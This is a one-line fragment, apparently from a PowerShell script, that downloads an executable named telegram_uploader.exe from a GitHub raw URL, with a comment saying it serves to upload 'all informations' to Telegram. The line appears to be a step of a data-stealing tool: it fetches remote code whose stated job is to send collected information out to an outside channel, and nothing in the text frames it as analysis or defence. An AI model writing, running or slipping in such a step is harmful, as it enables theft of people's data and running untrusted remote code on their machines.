...
Invoke-WebRequest https://github.com/Bakri-l/ASEL9i87654/blob/main/telegram_uploader.exe?raw=true -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
